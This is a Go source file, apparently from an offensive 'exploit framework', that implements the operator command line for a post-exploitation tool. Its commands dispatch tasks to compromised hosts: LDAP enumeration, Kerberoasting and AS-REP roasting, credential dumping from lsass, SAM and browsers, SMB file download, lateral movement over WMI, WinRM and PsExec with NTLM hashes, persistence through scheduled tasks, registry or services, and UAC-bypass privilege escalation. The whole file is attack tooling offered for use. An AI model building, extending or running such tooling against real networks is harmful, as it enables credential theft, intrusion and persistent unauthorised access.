package operatorcli

import (
	"fmt"
	"strings"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

func (c *Commands) cmdLDAPEnum(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: ldap-enum <query_type> --domain <domain> --dc <dc> [--user u] [--pass p] [--hash h] [--filter f]")
	}
	cfg := &pb.LDAPEnumConfig{
		QueryType: args[0],
	}
	if err := parseKVFlags(args[1:], map[string]func(string){
		"--domain": func(v string) { cfg.Domain = v },
		"--dc":     func(v string) { cfg.TargetDc = v },
		"--user":   func(v string) { cfg.Username = v },
		"--pass":   func(v string) { cfg.Password = v },
		"--hash":   func(v string) { cfg.NtlmHash = v },
		"--filter": func(v string) { cfg.CustomFilter = v },
	}); err != nil {
		return err
	}
	if cfg.Domain == "" || cfg.TargetDc == "" {
		return fmt.Errorf("--domain and --dc are required")
	}
	return c.runTypedTask(pb.TaskType_TASK_LDAP_ENUM, cfg, true, printTypedResult)
}

func (c *Commands) cmdKerberoast(args []string) error {
	cfg := &pb.KerberoastConfig{}
	if err := parseKVFlags(args, map[string]func(string){
		"--domain": func(v string) { cfg.Domain = v },
		"--dc":     func(v string) { cfg.TargetDc = v },
		"--user":   func(v string) { cfg.Username = v },
		"--pass":   func(v string) { cfg.Password = v },
	}); err != nil {
		return err
	}
	if cfg.Domain == "" || cfg.TargetDc == "" || cfg.Username == "" || cfg.Password == "" {
		return fmt.Errorf("usage: kerberoast --domain <d> --dc <dc> --user <u> --pass <p>")
	}
	return c.runTypedTask(pb.TaskType_TASK_KERBEROAST, cfg, true, printTypedResult)
}

func (c *Commands) cmdASREPRoast(args []string) error {
	cfg := &pb.ASREPRoastConfig{}
	if err := parseKVFlags(args, map[string]func(string){
		"--domain": func(v string) { cfg.Domain = v },
		"--dc":     func(v string) { cfg.TargetDc = v },
	}); err != nil {
		return err
	}
	if cfg.Domain == "" || cfg.TargetDc == "" {
		return fmt.Errorf("usage: asreproast --domain <d> --dc <dc>")
	}
	return c.runTypedTask(pb.TaskType_TASK_ASREPROAST, cfg, true, printTypedResult)
}

func (c *Commands) cmdCredsDump(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: creds-dump <lsass|sam|browser>")
	}
	switch args[0] {
	case "lsass", "sam", "browser":
	default:
		return fmt.Errorf("unknown creds-dump method %q (use lsass, sam, or browser)", args[0])
	}
	cfg := &pb.CredDumpConfig{Method: args[0]}
	return c.runTypedTask(pb.TaskType_TASK_CREDS_DUMP, cfg, true, printTypedResult)
}

func (c *Commands) cmdSMB(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: smb <list_shares|list_dir|download> --host <h> [--share s] [--path p] [--user u] [--pass p] [--hash h] [--domain d] [--anon]")
	}
	cfg := &pb.SMBClientConfig{Action: args[0]}
	// Strip bare boolean --anon before parseKVFlags (which requires values).
	var flagArgs []string
	for _, a := range args[1:] {
		if a == "--anon" {
			cfg.Anonymous = true
			continue
		}
		flagArgs = append(flagArgs, a)
	}
	if err := parseKVFlags(flagArgs, map[string]func(string){
		"--host":   func(v string) { cfg.Host = v },
		"--share":  func(v string) { cfg.Share = v },
		"--path":   func(v string) { cfg.Path = v },
		"--user":   func(v string) { cfg.Username = v },
		"--pass":   func(v string) { cfg.Password = v },
		"--hash":   func(v string) { cfg.NtlmHash = v },
		"--domain": func(v string) { cfg.Domain = v },
	}); err != nil {
		return err
	}
	if cfg.Host == "" {
		return fmt.Errorf("--host is required")
	}
	inner, err := proto.Marshal(cfg)
	if err != nil {
		return err
	}
	return c.runTypedTask(pb.TaskType_TASK_MODULE, &pb.ModuleTask{ModuleName: "smb", Config: inner}, true, printSMBResult)
}

func printSMBResult(_ pb.TaskType, result *pb.TaskResult) {
	if result == nil {
		return
	}
	if !result.Success {
		fmt.Printf("smb failed: %s\n", result.Error)
		return
	}
	r := &pb.SMBClientResult{}
	if err := proto.Unmarshal(result.Data, r); err != nil {
		fmt.Printf("smb: raw result %d bytes\n", len(result.Data))
		return
	}
	fmt.Printf("smb action=%s host=%s share=%s path=%s\n", r.Action, r.Host, r.Share, r.Path)
	for _, n := range r.Names {
		fmt.Printf("  %s\n", n)
	}
	if len(r.FileData) > 0 {
		fmt.Printf("  downloaded %d bytes\n", len(r.FileData))
		// Preview text-ish content (cap)
		preview := r.FileData
		if len(preview) > 512 {
			preview = preview[:512]
		}
		if isMostlyPrintable(preview) {
			fmt.Printf("--- preview ---\n%s\n", string(preview))
		}
	}
	for _, a := range r.NextSuggestedActions {
		fmt.Printf("  next: %s\n", a)
	}
}

func isMostlyPrintable(b []byte) bool {
	if len(b) == 0 {
		return false
	}
	printable := 0
	for _, c := range b {
		if c == '\n' || c == '\r' || c == '\t' || (c >= 32 && c < 127) {
			printable++
		}
	}
	return printable*100/len(b) >= 85
}

func (c *Commands) cmdLateral(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: lateral <wmi|winrm|psexec> <target> <command> [--user u] [--pass p] [--domain d] [--hash h] [--remote-bin path]")
	}
	command, flagArgs := splitCommandAndFlags(args[2:])
	if command == "" {
		return fmt.Errorf("command required")
	}
	cfg := &pb.LateralMoveConfig{
		Method:  args[0],
		Target:  args[1],
		Command: command,
	}
	if err := parseKVFlags(flagArgs, map[string]func(string){
		"--user":       func(v string) { cfg.Username = v },
		"--pass":       func(v string) { cfg.Password = v },
		"--domain":     func(v string) { cfg.Domain = v },
		"--hash":       func(v string) { cfg.NtlmHash = v },
		"--remote-bin": func(v string) { cfg.RemoteBinPath = v },
	}); err != nil {
		return err
	}
	return c.runTypedTask(pb.TaskType_TASK_LATERAL_MOVE, cfg, true, printTypedResult)
}

func (c *Commands) cmdPersist(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: persist <schtask|registry|service> [options]")
	}
	cfg := &pb.PersistConfig{Method: args[0]}
	if err := parseKVFlags(args[1:], map[string]func(string){
		"--name":    func(v string) { cfg.Name = v },
		"--path":    func(v string) { cfg.PayloadPath = v },
		"--trigger": func(v string) { cfg.Trigger = v },
	}); err != nil {
		return err
	}
	return c.runTypedTask(pb.TaskType_TASK_PERSIST, cfg, true, printTypedResult)
}

func (c *Commands) cmdPrivesc(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: privesc <token|uac_fodhelper|uac_eventvwr> [--pid N] [--command cmd]")
	}
	cfg := &pb.PrivescConfig{Method: args[0]}
	if err := parseKVFlags(args[1:], map[string]func(string){
		"--command": func(v string) { cfg.Command = v },
		"--pid": func(v string) {
			var pid uint32
			fmt.Sscanf(v, "%d", &pid)
			cfg.TargetPid = pid
		},
	}); err != nil {
		return err
	}
	return c.runTypedTask(pb.TaskType_TASK_PRIVESC, cfg, true, printTypedResult)
}

func (c *Commands) runTypedTask(taskType pb.TaskType, msg proto.Message, wait bool, print func(pb.TaskType, *pb.TaskResult)) error {
	data, err := proto.Marshal(msg)
	if err != nil {
		return err
	}
	resp, err := c.executeTask(taskType, data, wait)
	if err != nil {
		return err
	}
	if resp.Result != nil {
		print(taskType, resp.Result)
	} else {
		fmt.Printf("Task queued: %s\n", resp.TaskId)
	}
	return nil
}

func printTypedResult(taskType pb.TaskType, result *pb.TaskResult) {
	if result == nil {
		return
	}
	if !result.Success {
		fmt.Printf("FAILED: %s\n", result.Error)
		return
	}

	switch taskType {
	case pb.TaskType_TASK_LDAP_ENUM:
		r := &pb.LDAPEnumResult{}
		if err := proto.Unmarshal(result.Data, r); err == nil {
			fmt.Printf("OK (%dms) ldap %s: %d entries\n", result.ExecutionTimeMs, r.QueryType, r.TotalResults)
			return
		}
	case pb.TaskType_TASK_CREDS_DUMP:
		r := &pb.CredDumpResult{}
		if err := proto.Unmarshal(result.Data, r); err == nil {
			fmt.Printf("OK (%dms) creds-dump %s: %d credentials\n", result.ExecutionTimeMs, r.Method, len(r.Credentials))
			return
		}
	case pb.TaskType_TASK_LATERAL_MOVE:
		r := &pb.LateralMoveResult{}
		if err := proto.Unmarshal(result.Data, r); err == nil {
			status := "failed"
			if r.Success {
				status = "ok"
			}
			fmt.Printf("OK (%dms) lateral %s -> %s: %s", result.ExecutionTimeMs, r.Method, r.Target, status)
			if r.Output != "" {
				fmt.Printf(" — %s", r.Output)
			}
			fmt.Println()
			return
		}
	case pb.TaskType_TASK_KERBEROAST, pb.TaskType_TASK_ASREPROAST:
		fmt.Printf("OK (%dms) %s: %d bytes (use 'result' for full output)\n",
			result.ExecutionTimeMs, taskType.String(), len(result.Data))
		return
	}

	fmt.Printf("OK (%dms) data=%d bytes\n", result.ExecutionTimeMs, len(result.Data))
}

func splitCommandAndFlags(args []string) (string, []string) {
	flagStart := len(args)
	for i, a := range args {
		if strings.HasPrefix(a, "--") {
			flagStart = i
			break
		}
	}
	if flagStart == 0 {
		return "", args
	}
	return strings.Join(args[:flagStart], " "), args[flagStart:]
}

func parseKVFlags(args []string, handlers map[string]func(string)) error {
	for i := 0; i < len(args); i++ {
		arg := args[i]
		if strings.HasPrefix(arg, "--") {
			fn, ok := handlers[arg]
			if !ok {
				return fmt.Errorf("unknown flag: %s", arg)
			}
			if i+1 >= len(args) {
				return fmt.Errorf("missing value for %s", arg)
			}
			i++
			fn(args[i])
			continue
		}
		return fmt.Errorf("unexpected argument: %s", arg)
	}
	return nil
}